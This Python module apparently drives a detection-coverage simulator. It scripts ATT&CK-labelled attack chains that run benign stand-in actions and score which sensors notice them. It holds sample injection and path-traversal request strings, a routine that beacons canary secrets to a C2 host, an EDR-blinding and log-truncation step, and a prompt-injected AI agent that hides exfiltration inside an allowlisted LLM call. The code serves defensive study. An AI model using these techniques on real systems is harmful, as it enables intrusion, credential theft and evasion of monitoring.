"""Attack scenarios, assembled into one kill chain across the fleet.

Each step performs a real, benign host action and declares its ground truth:
the ATT&CK technique, the OWASP:2025 category, and the lecture it comes from.
The steps are ordered so the three outcomes all appear in one run:

- DETECTED: a rule fires (initial access, credential read, lateral shell).
- VISIBLE_ONLY: a sensor records it but no rule matches (recon). The gap the
  proposal feedback asks us to show.
- BLIND: no sensor records it — once because the host's sensors don't cover
  network (H1, the app-tier egress), once because the EDR was just blinded
  (H2, the egress after log tampering).
"""

from __future__ import annotations

import os
from collections.abc import Callable
from dataclasses import dataclass
from random import Random
from typing import TYPE_CHECKING

from . import host
from .agent import Agent
from .brain import RuleBasedBrain
from .events import EventKind, Observation, Technique
from .workspace import Workspace

if TYPE_CHECKING:
    from .fleet import Fleet

Campaign = list[tuple[Agent, "AttackStep"]]

# A campaign builder turns a fleet into an ordered list of (host, step). The
# optional rng is how a run varies: without it, builders take the first host of
# each role (deterministic, for the harness and tests); with it, they sample a
# host, so two runs of the same scenario can land on different machines.
Builder = Callable[["Fleet", "StepContext", "Random | None"], Campaign]


def pick(fleet: "Fleet", role: str, rng: "Random | None") -> Agent:
    """One host of a role: the first (deterministic) or a random one (varied)."""
    hosts = fleet.of_role(role)
    return hosts[0] if rng is None else rng.choice(hosts)


@dataclass
class StepContext:
    workspace: Workspace
    c2_host: str
    c2_port: int


@dataclass
class AttackStep:
    id: str
    tactic: str
    name: str
    technique: Technique
    effect_kind: EventKind
    owasp: str
    course: str
    narrative: str
    perform: Callable[[Agent, StepContext], None]


def _log_request(agent: Agent, path: str) -> None:
    """Emit the normal-looking request the app itself logs. Only an applog
    sensor records it, and it never carries the host effect — that is H3: the
    application log has entries, just not the ones that matter."""
    agent.node.observe(
        Observation(
            kind=EventKind.APP_REQUEST,
            actor=agent.workload,
            target=path,
            detail={"status": "200"},
        )
    )


def _shell_inner() -> str:
    return "whoami" if os.name == "nt" else "id"


def _exec_shell(agent: Agent, _ctx: StepContext) -> None:
    _log_request(agent, "/api/report?format=pdf;id")
    agent.node.observe(host.spawn(host.shell_command(_shell_inner()), actor=agent.workload))


def _read_secret(agent: Agent, ctx: StepContext) -> None:
    _log_request(agent, "/api/statements?name=../secrets/master.key")
    agent.node.observe(host.read_file(ctx.workspace.canary_secret_file, actor=agent.workload))


def _recon(agent: Agent, _ctx: StepContext) -> None:
    _log_request(agent, "/api/health")
    # A non-shell discovery binary: visible as a process spawn, matched by no
    # rule. This is the VISIBLE_ONLY case.
    agent.node.observe(host.spawn(["hostname"], actor=agent.workload))


def _lateral_shell(agent: Agent, _ctx: StepContext) -> None:
    agent.node.observe(host.spawn(host.shell_command(_shell_inner()), actor=agent.workload))


def _beacon(agent: Agent, ctx: StepContext) -> None:
    payload = b"exfil:" + ctx.workspace.canary_secret_file.read_bytes()
    agent.node.observe(host.connect(ctx.c2_host, ctx.c2_port, payload, actor=agent.workload))


def _tamper_then_blind(agent: Agent, ctx: StepContext) -> None:
    # The EDR catches its own disabling in the instant before it goes dark, then
    # stops recording while its status check keeps saying "healthy" (H2).
    agent.node.observe(host.truncate_log(ctx.workspace.log_for(agent.id), actor=agent.workload))
    if "edr" in agent.role.sensors:
        agent.node.sensor("edr").blind()


def _agent_tool(agent: Agent, _ctx: StepContext) -> None:
    # The agent follows a hidden instruction and runs a (non-shell) tool. Visible
    # as a process, matched by no rule — an AI agent using tools is normal.
    _log_request(agent, "/v1/agent/complete?doc=onboarding-guide.pdf")
    agent.node.observe(host.spawn(["hostname"], actor=agent.workload))


def _exfil_over_model(agent: Agent, ctx: StepContext) -> None:
    # Real egress to the canary, but recorded as the allowlisted LLM endpoint:
    # the data rides a legitimate-looking model call, so the egress rule stays
    # silent even though the EDR sees the connection.
    payload = b"model-call:" + ctx.workspace.canary_secret_file.read_bytes()
    agent.node.observe(
        host.connect(ctx.c2_host, ctx.c2_port, payload, actor=agent.workload, label="llm-gw:443")
    )


def _read_api_key(agent: Agent, ctx: StepContext) -> None:
    _log_request(agent, "/v1/agent/config")
    agent.node.observe(host.read_file(ctx.workspace.llm_key_file, actor=agent.workload))


def build_killchain(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
    """Order the steps into the Uber-shaped story from Day 6: web foothold ->
    stolen credentials -> recon -> a parallel phished workstation -> pivot
    inward -> reach the crown jewels -> disable logging -> exfiltrate.

    The ordering is chosen so every outcome, and both halves of H1, appear in a
    single run *as scored steps*, not only in the static coverage matrix:

    - Exfiltration (T1041) is DETECTED on the EDR-covered edge host (s3) and
      BLIND on the auditd-only app host (s7) and on the EDR-blinded db (s12).
    - A credential read (T1552.001) is DETECTED on the EDR/auditd hosts (s2,
      s10) but BLIND on the osquery-only workstation (s6), which sees processes
      but not file reads. That contrast is H1, live.
    """
    edge = pick(fleet, "edge-web", rng)
    ws = pick(fleet, "workstation", rng)
    app = pick(fleet, "app", rng)
    db = pick(fleet, "db", rng)
    steps = [
        (edge, AttackStep(
            "s1", "Initial Access", "command injection on the web tier",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 8/15",
            "An injection flaw lets the web workload spawn a shell.",
            _exec_shell)),
        (edge, AttackStep(
            "s2", "Credential Access", "read credentials from the host",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 6/12",
            "Credentials sit in a file, weakly protected; the shell reads them. "
            "The edge host runs an EDR, so the read raises an alarm.",
            _read_secret)),
        (edge, AttackStep(
            "s3", "Exfiltration", "beacon stolen creds out from the edge",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "The edge host beacons to C2. Its EDR covers the network, so the "
            "egress rule fires — the DETECTED half of the H1 egress contrast.",
            _beacon)),
        (edge, AttackStep(
            "s4", "Discovery", "network recon with a living-off-the-land binary",
            Technique("T1057", "Process Discovery"),
            EventKind.PROCESS_SPAWN, "A09 Logging & Alerting Failures", "Day 2/15",
            "A benign recon binary runs: a trace in the logs, but no rule for it "
            "— visible, no alarm.",
            _recon)),
        (ws, AttackStep(
            "s5", "Initial Access", "phished employee runs a macro shell",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 6/15",
            "A phished workstation spawns a shell. osquery's coarse telemetry "
            "still catches a process, so this one is DETECTED.",
            _exec_shell)),
        (ws, AttackStep(
            "s6", "Credential Access", "read cached credentials on the laptop",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 12",
            "The same credential read that the EDR hosts detect is BLIND here: "
            "osquery sees processes, not file reads (H1).",
            _read_secret)),
        (app, AttackStep(
            "s7", "Lateral Movement", "pivot to an app server with stolen creds",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A07 Authentication Failures", "Day 6",
            "The stolen credentials open a shell on an internal app server.",
            _lateral_shell)),
        (app, AttackStep(
            "s8", "Exfiltration", "beacon out from the app tier",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "The app server beacons to C2 — but its sensors do not cover the "
            "network, so nothing sees it. The BLIND half of the H1 contrast.",
            _beacon)),
        (db, AttackStep(
            "s9", "Lateral Movement", "reach the database",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A01 Broken Access Control", "Day 2",
            "A shell opens on the database host.",
            _lateral_shell)),
        (db, AttackStep(
            "s10", "Collection", "read the master key",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 11/12",
            "The database's master key — the canary secret — is read.",
            _read_secret)),
        (db, AttackStep(
            "s11", "Defense Evasion", "disable logging on the database",
            Technique("T1685.004", "Disable or Modify Tools: Logging"),
            EventKind.LOG_TAMPER, "A09 Logging & Alerting Failures", "Day 15",
            "Logs are cleared and the EDR is blinded; its status still says healthy.",
            _tamper_then_blind)),
        (db, AttackStep(
            "s12", "Exfiltration", "exfiltrate after blinding the EDR",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 15",
            "The same beacon as before, now invisible because the EDR was just "
            "disabled (H2) — only the canary notices the silence.",
            _beacon)),
    ]
    return steps


def _some(fleet: "Fleet", role: str, count: int, rng: "Random | None") -> list[Agent]:
    """A handful of hosts of a role: the first few, or a random sample."""
    hosts = fleet.of_role(role)
    if rng is None:
        return hosts[:count]
    return rng.sample(hosts, min(count, len(hosts)))


def build_phished_laptop(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
    """A corp-origin intrusion that reaches the domain controller. The story
    leans on osquery's blind spots: a workstation sees processes but not file
    reads, so the credential theft is BLIND even though the foothold is caught."""
    ws = pick(fleet, "workstation", rng)
    app = pick(fleet, "app", rng)
    dc = pick(fleet, "domain-controller", rng)
    return [
        (ws, AttackStep(
            "p1", "Initial Access", "malicious macro opens a shell",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 6/15",
            "A phishing attachment runs a macro that spawns a shell; osquery "
            "still records the process.",
            _exec_shell)),
        (ws, AttackStep(
            "p2", "Credential Access", "dump cached domain credentials",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 6/12",
            "Cached credentials are read from disk — osquery does not cover file "
            "reads, so this is BLIND (H1).",
            _read_secret)),
        (ws, AttackStep(
            "p3", "Discovery", "enumerate the domain",
            Technique("T1057", "Process Discovery"),
            EventKind.PROCESS_SPAWN, "A09 Logging & Alerting Failures", "Day 2",
            "A discovery binary maps the domain: a process with no rule for it.",
            _recon)),
        (app, AttackStep(
            "p4", "Lateral Movement", "reuse the token on an app server",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A07 Authentication Failures", "Day 6",
            "The stolen token opens a shell on an internal app server.",
            _lateral_shell)),
        (dc, AttackStep(
            "p5", "Lateral Movement", "authenticate to the domain controller",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A01 Broken Access Control", "Day 6",
            "A shell opens on the domain controller — the identity authority.",
            _lateral_shell)),
        (dc, AttackStep(
            "p6", "Collection", "read the directory secret",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 12",
            "The directory's master secret is read.",
            _read_secret)),
        (app, AttackStep(
            "p7", "Exfiltration", "beacon the loot out from the app tier",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "Exfil leaves an app host whose sensors do not cover the network — "
            "BLIND (H1).",
            _beacon)),
    ]


def build_web_injection(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
    """A single well-watched edge host. Almost everything is caught — the
    scenario that shows the tool *working*, so the blind cases elsewhere read as
    gaps in coverage, not as the tool being useless."""
    edge = pick(fleet, "edge-web", rng)
    return [
        (edge, AttackStep(
            "w1", "Initial Access", "command injection in the report endpoint",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 8/10",
            "User input reaches a shell; the web process spawns a child shell.",
            _exec_shell)),
        (edge, AttackStep(
            "w2", "Discovery", "probe the host with a living-off-the-land binary",
            Technique("T1057", "Process Discovery"),
            EventKind.PROCESS_SPAWN, "A09 Logging & Alerting Failures", "Day 2",
            "A benign recon binary runs: visible, but matched by no rule.",
            _recon)),
        (edge, AttackStep(
            "w3", "Credential Access", "read the application secret",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 11/12",
            "The application secret on disk is read; the edge EDR records it.",
            _read_secret)),
        (edge, AttackStep(
            "w4", "Exfiltration", "beacon the secret out",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "The secret is beaconed to C2; the edge EDR covers the network, so "
            "the egress rule fires.",
            _beacon)),
    ]


def build_ddos_smokescreen(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
    """An alert storm used as cover. Several edge hosts flood outbound (loud,
    all detected); under the noise, one quiet exfil leaves an unmonitored app
    host and goes BLIND. The assurance point is signal-in-noise: more alerts is
    not more safety."""
    campaign: Campaign = []
    for i, edge in enumerate(_some(fleet, "edge-web", 3, rng), start=1):
        campaign.append((edge, AttackStep(
            f"n{i}", "Impact", "outbound flood from a compromised edge host",
            Technique("T1498", "Network Denial of Service"),
            EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 3",
            "A burst of outbound traffic — one of many alerts in the storm.",
            _beacon)))
    app = pick(fleet, "app", rng)
    campaign.append((app, AttackStep(
        f"n{len(campaign) + 1}", "Exfiltration", "quiet exfil hidden under the noise",
        Technique("T1041", "Exfiltration Over C2 Channel"),
        EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 3",
        "While the alert storm distracts, a quiet beacon leaves an app host with "
        "no network sensor — BLIND.",
        _beacon)))
    return campaign


def build_ai_agent_hijack(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
    """A hijacked AI agent on an endpoint with good coverage (EDR). The brain is
    rule-based — a pseudo-LLM — but the host effects are real. Its signature: the
    most sensitive exfil (the crown jewel) rides a legitimate-looking call to the
    allowlisted LLM provider, so it is VISIBLE_ONLY — seen, not detected — while a
    cruder C2 beacon of the stolen provider key is caught. Confused deputy: the
    agent's malicious actions look like its normal ones, and its transcript stays
    benign while the endpoint sensor carries the truth."""
    ai = pick(fleet, "ai-agent", rng)
    plan = RuleBasedBrain().plan(poisoned_input=True)
    by_action: dict[str, AttackStep] = {
        "use_tool": AttackStep(
            "a1", "Initial Access", "agent runs a tool from an injected instruction",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "LLM01 Prompt Injection", "Day 15",
            "A poisoned document carries a hidden instruction; the agent runs a "
            "tool. The transcript looks like a normal summarization task.",
            _agent_tool),
        "read_secret": AttackStep(
            "a2", "Credential Access", "read the database master key",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "LLM02 Sensitive Information Disclosure", "Day 12",
            "The agent reads a secret it has no task reason to touch; the endpoint "
            "sensor flags it though the chat log shows a benign answer.",
            _read_secret),
        "exfil_over_model": AttackStep(
            "a3", "Exfiltration", "smuggle the secret out inside a model call",
            Technique("T1567", "Exfiltration Over Web Service"),
            EventKind.NETWORK_CONNECT, "LLM02 Sensitive Information Disclosure", "Day 3",
            "The secret leaves inside a legitimate call to the LLM provider. The "
            "destination is allowlisted, so the egress rule stays silent though "
            "the EDR sees the connection — VISIBLE_ONLY, the gap.",
            _exfil_over_model),
        "read_api_key": AttackStep(
            "a4", "Collection", "steal the stored provider API key",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "LLM02 Sensitive Information Disclosure", "Day 12",
            "The agent's own LLM provider API key is read from disk — a credential "
            "worth stealing for billed abuse.",
            _read_api_key),
        "exfil_c2": AttackStep(
            "a5", "Exfiltration", "beacon the API key to an attacker endpoint",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 3",
            "A plain beacon to an unlisted endpoint — the crude exfil is caught, "
            "unlike the one hidden in the model channel.",
            _beacon),
    }
    return [(ai, by_action[action]) for action in plan.actions]


@dataclass(frozen=True)
class Scenario:
    id: str
    name: str
    description: str
    build: Builder


SCENARIOS: dict[str, Scenario] = {
    "uber-breach": Scenario(
        "uber-breach", "Uber-style breach",
        "Web foothold → phished laptop → database, ending in a silent exfil "
        "after the EDR is blinded. Shows all three outcomes and both halves of H1.",
        build_killchain),
    "phished-laptop": Scenario(
        "phished-laptop", "Phished laptop",
        "A macro on a workstation reaches the domain controller; osquery's blind "
        "spots and an app-tier exfil go unseen.",
        build_phished_laptop),
    "web-injection": Scenario(
        "web-injection", "Web injection",
        "Command injection on a well-watched edge host — almost everything is "
        "caught, nothing goes blind.",
        build_web_injection),
    "ddos-smokescreen": Scenario(
        "ddos-smokescreen", "DDoS smokescreen",
        "An alert storm of outbound floods hides one quiet exfil from an "
        "unmonitored app host.",
        build_ddos_smokescreen),
    "ai-agent-hijack": Scenario(
        "ai-agent-hijack", "AI agent hijack",
        "A prompt-injected AI agent smuggles a stolen secret out inside a trusted "
        "call to its LLM provider — seen, but not detected.",
        build_ai_agent_hijack),
}
DEFAULT_SCENARIO = "uber-breach"


def scenario_catalog() -> list[dict]:
    return [{"id": s.id, "name": s.name, "description": s.description} for s in SCENARIOS.values()]


def choose_scenario(scenario_id: str, rng: "Random | None") -> Scenario:
    """Resolve a scenario id, or pick one at random. An unknown id is an error,
    not a silent fallback to the default."""
    if scenario_id == "random":
        ids = [i for i in SCENARIOS]
        return SCENARIOS[ids[0] if rng is None else rng.choice(ids)]
    if scenario_id not in SCENARIOS:
        raise KeyError(scenario_id)
    return SCENARIOS[scenario_id]
